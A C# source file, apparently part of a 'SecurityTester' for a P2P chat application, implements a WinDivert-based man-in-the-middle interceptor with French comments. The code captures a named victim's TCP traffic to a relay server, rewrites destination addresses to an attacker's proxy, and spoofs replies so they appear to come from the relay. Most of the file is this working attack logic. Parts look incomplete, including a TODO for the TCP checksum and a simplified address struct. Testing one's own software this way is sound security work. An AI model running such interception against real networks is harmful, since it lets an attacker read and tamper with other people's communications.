using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ChatP2P.SecurityTester.Network
{
    /// <summary>
    /// 🕷️ WinDivert interceptor pour manipulation de packets en temps réel
    /// </summary>
    public class WinDivertInterceptor
    {
        private IntPtr _handle = IntPtr.Zero;
        private bool _isRunning = false;
        private CancellationTokenSource? _cancellationToken;
        private readonly string _relayServerIP;
        private readonly string _attackerIP;
        private readonly string _victimIP;
        private readonly Dictionary<int, TcpClient> _interceptedConnections = new();

        public event Action<string>? LogMessage;
        public event Action<string, byte[]>? PacketIntercepted;

        public WinDivertInterceptor(string relayServerIP, string attackerIP, string victimIP = "")
        {
            _relayServerIP = relayServerIP;
            _attackerIP = attackerIP;
            _victimIP = victimIP;
        }

        /// <summary>
        /// 🚀 Démarre l'interception WinDivert pour MITM complet
        /// </summary>
        public async Task<bool> StartInterception()
        {
            try
            {
                LogMessage?.Invoke("🕷️ DÉMARRAGE WINDIVERT PROMISCUOUS INTERCEPTOR:");
                LogMessage?.Invoke($"   🎯 Relay Server: {_relayServerIP}");
                LogMessage?.Invoke($"   🕷️ Attaquant: {_attackerIP}");
                LogMessage?.Invoke($"   👤 Victime: {_victimIP}");

                // 🕷️ FILTER PROMISCUOUS: Capturer TOUS packets ChatP2P sur le réseau
                // NETWORK_FORWARD layer peut voir packets en transit vers relay server
                string filter;
                if (!string.IsNullOrEmpty(_victimIP))
                {
                    // 🔄 FILTRE BIDIRECTIONNEL: Victime→Relay ET Attaquant→Victime
                    filter = $"tcp and (" +
                            $"(ip.SrcAddr == {_victimIP} and ip.DstAddr == {_relayServerIP}) or " +
                            $"(ip.SrcAddr == {_attackerIP} and ip.DstAddr == {_victimIP})" +
                            $") and (tcp.DstPort == 7777 or tcp.DstPort == 8888 or tcp.DstPort == 8889 or tcp.DstPort == 8891 or tcp.SrcPort == 7777 or tcp.SrcPort == 8888 or tcp.SrcPort == 8889 or tcp.SrcPort == 8891)";
                    LogMessage?.Invoke($"🔧 WinDivert Filter BIDIRECTIONNEL: {filter}");
                }
                else
                {
                    // Filtre générique pour tous packets ChatP2P vers relay
                    filter = $"tcp and ip.DstAddr == {_relayServerIP} and (tcp.DstPort == 7777 or tcp.DstPort == 8888 or tcp.DstPort == 8889 or tcp.DstPort == 8891)";
                    LogMessage?.Invoke($"🔧 WinDivert Filter GÉNÉRAL: {filter}");
                }

                LogMessage?.Invoke($"🔄 Mode: NETWORK - Capture packets locaux ET forwarded");

                // 🔄 UTILISER NETWORK pour voir packets locaux ET forwarded
                // NETWORK layer voit TOUS les packets (locaux + routés)
                _handle = WinDivertOpen(filter, WinDivertLayer.WINDIVERT_LAYER_NETWORK, 1000, 0);

                if (_handle == IntPtr.Zero || _handle == new IntPtr(-1))
                {
                    var error = Marshal.GetLastWin32Error();
                    LogMessage?.Invoke($"❌ WinDivert open failed: Error {error}");
                    LogMessage?.Invoke($"   ⚠️ Nécessite privilèges administrateur");
                    LogMessage?.Invoke($"   ⚠️ WinDivert driver doit être installé");
                    return false;
                }

                LogMessage?.Invoke("✅ WinDivert handle ouvert avec succès");

                _isRunning = true;
                _cancellationToken = new CancellationTokenSource();

                // Démarrer boucle d'interception
                _ = Task.Run(async () => await InterceptionLoop(_cancellationToken.Token));

                LogMessage?.Invoke("🕷️ WinDivert MITM actif - Interception packets relay server");
                LogMessage?.Invoke($"📡 Redirection automatique: {_relayServerIP} → {_attackerIP}");

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur WinDivert: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 🔄 Boucle principale d'interception packets
        /// </summary>
        private async Task InterceptionLoop(CancellationToken cancellationToken)
        {
            try
            {
                var buffer = new byte[65535];
                var addr = new WinDivertAddress();

                LogMessage?.Invoke("🔄 WinDivert interception loop started...");

                while (_isRunning && !cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        // Recevoir packet intercepté
                        uint packetLen = 0;
                        bool success = WinDivertRecv(_handle, buffer, (uint)buffer.Length, ref packetLen, ref addr);

                        if (!success)
                        {
                            var error = Marshal.GetLastWin32Error();
                            if (error != 6) // Ignore handle closed errors
                                LogMessage?.Invoke($"⚠️ WinDivertRecv error: {error}");
                            continue;
                        }

                        if (packetLen == 0) continue;

                        LogMessage?.Invoke($"📦 PACKET INTERCEPTÉ: {packetLen} bytes");

                        // Analyser et modifier packet
                        var modifiedPacket = await ProcessInterceptedPacket(buffer, (int)packetLen, addr);

                        // Renvoyer packet modifié
                        if (modifiedPacket != null)
                        {
                            uint sentLen = 0;
                            WinDivertSend(_handle, modifiedPacket, (uint)modifiedPacket.Length, ref sentLen, ref addr);
                            LogMessage?.Invoke($"📤 PACKET REDIRIGÉ: {sentLen} bytes");
                        }
                    }
                    catch (Exception ex)
                    {
                        LogMessage?.Invoke($"❌ Erreur interception packet: {ex.Message}");
                    }

                    // Petite pause pour éviter 100% CPU
                    await Task.Delay(1, cancellationToken);
                }
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                LogMessage?.Invoke($"❌ Erreur boucle interception: {ex.Message}");
            }
        }

        /// <summary>
        /// 🎯 Traite et modifie les packets interceptés
        /// </summary>
        private async Task<byte[]?> ProcessInterceptedPacket(byte[] packet, int length, WinDivertAddress addr)
        {
            try
            {
                // Parse IP header pour obtenir destination
                if (length < 20) return packet; // IP header minimum

                // IP destination offset 16-19
                byte[] destIP = new byte[4];
                Array.Copy(packet, 16, destIP, 0, 4);
                var destination = new IPAddress(destIP).ToString();

                LogMessage?.Invoke($"🔍 Packet intercepté: {destination}");

                // Parse IP source pour déterminer direction
                byte[] srcIP = new byte[4];
                Array.Copy(packet, 12, srcIP, 0, 4);
                var source = new IPAddress(srcIP).ToString();

                // 🕷️ MITM LOGIC: Détecter et rediriger packets de la victime
                bool isVictimPacket = string.IsNullOrEmpty(_victimIP) || source == _victimIP;

                if (destination == _relayServerIP && isVictimPacket)
                {
                    // 🎯 VICTIME → RELAY INTERCEPTÉ: Rediriger vers notre proxy
                    LogMessage?.Invoke($"🎯 VICTIM PACKET INTERCEPTED: {source} → {destination}");
                    LogMessage?.Invoke($"🔄 REDIRECTING TO ATTACKER PROXY: → {_attackerIP}");

                    // Rediriger vers IP attaquant où écoutent nos proxies TCP
                    var attackerBytes = IPAddress.Parse(_attackerIP).GetAddressBytes();
                    Array.Copy(attackerBytes, 0, packet, 16, 4);

                    // Recalculer checksums après modification
                    RecalculateChecksums(packet, length);

                    PacketIntercepted?.Invoke($"MITM: {source}→ATTACKER-PROXY (was {destination})", packet);
                    LogMessage?.Invoke($"✅ PACKET REDIRECTED: {source} → {_attackerIP}");
                    return packet;
                }
                else if (source == _attackerIP && destination == _victimIP)
                {
                    // 🔄 RETOUR ATTAQUANT → VICTIME: Masquer comme si ça venait du relay
                    LogMessage?.Invoke($"🔄 ATTACKER RESPONSE: {source} → {destination}");
                    LogMessage?.Invoke($"🎭 MASQUERADING AS RELAY: → {_relayServerIP}");

                    // Masquer la source comme si ça venait du relay server
                    var relayBytes = IPAddress.Parse(_relayServerIP).GetAddressBytes();
                    Array.Copy(relayBytes, 0, packet, 12, 4);

                    // Recalculer checksums après modification
                    RecalculateChecksums(packet, length);

                    PacketIntercepted?.Invoke($"MASQUERADE: {_attackerIP}→{destination} (as {_relayServerIP})", packet);
                    LogMessage?.Invoke($"✅ RESPONSE MASQUERADED: {_relayServerIP} → {destination}");
                    return packet;
                }
                else if (destination == _relayServerIP)
                {
                    // Packet vers relay mais pas de la victime (peut-être de nous)
                    LogMessage?.Invoke($"📦 Other packet to relay: {source} → {destination}");
                    return packet;
                }
                else if (source == _relayServerIP)
                {
                    // Réponse du relay server - laisser passer normalement
                    LogMessage?.Invoke($"📤 Relay response: {source} → {destination}");
                    PacketIntercepted?.Invoke($"RELAY RESPONSE: {source}→{destination}", packet);
                    return packet;
                }
                else
                {
                    // Autre trafic - laisser passer
                    LogMessage?.Invoke($"📦 Passthrough: {source} → {destination}");
                    return packet;
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur traitement packet: {ex.Message}");
                return packet; // Laisser passer en cas d'erreur
            }
        }

        /// <summary>
        /// 🔧 Recalcule les checksums IP et TCP après modification
        /// </summary>
        private void RecalculateChecksums(byte[] packet, int length)
        {
            try
            {
                // Reset IP checksum
                packet[10] = 0;
                packet[11] = 0;

                // Calculer nouveau IP checksum
                uint sum = 0;
                for (int i = 0; i < 20; i += 2)
                {
                    sum += (uint)((packet[i] << 8) + packet[i + 1]);
                }
                while ((sum >> 16) != 0)
                {
                    sum = (sum & 0xFFFF) + (sum >> 16);
                }
                sum = ~sum;

                packet[10] = (byte)(sum >> 8);
                packet[11] = (byte)(sum & 0xFF);

                LogMessage?.Invoke("🔧 IP checksum recalculé");

                // TODO: TCP checksum si nécessaire
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur recalcul checksum: {ex.Message}");
            }
        }

        public void StopInterception()
        {
            try
            {
                _isRunning = false;
                _cancellationToken?.Cancel();

                if (_handle != IntPtr.Zero)
                {
                    WinDivertClose(_handle);
                    _handle = IntPtr.Zero;
                }

                LogMessage?.Invoke("⏹️ WinDivert interceptor arrêté");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur arrêt WinDivert: {ex.Message}");
            }
        }

        public bool IsRunning => _isRunning;

        #region WinDivert P/Invoke

        [DllImport("WinDivert.dll", SetLastError = true)]
        private static extern IntPtr WinDivertOpen(string filter, WinDivertLayer layer, short priority, ulong flags);

        [DllImport("WinDivert.dll", SetLastError = true)]
        private static extern bool WinDivertRecv(IntPtr handle, byte[] packet, uint packetLen, ref uint readLen, ref WinDivertAddress addr);

        [DllImport("WinDivert.dll", SetLastError = true)]
        private static extern bool WinDivertSend(IntPtr handle, byte[] packet, uint packetLen, ref uint writeLen, ref WinDivertAddress addr);

        [DllImport("WinDivert.dll", SetLastError = true)]
        private static extern bool WinDivertClose(IntPtr handle);

        [StructLayout(LayoutKind.Sequential)]
        private struct WinDivertAddress
        {
            public ulong Timestamp;
            public uint IfIdx;
            public uint SubIfIdx;
            public byte Direction;
        }

        private enum WinDivertLayer
        {
            WINDIVERT_LAYER_NETWORK = 0,
            WINDIVERT_LAYER_NETWORK_FORWARD = 1
        }

        #endregion
    }
}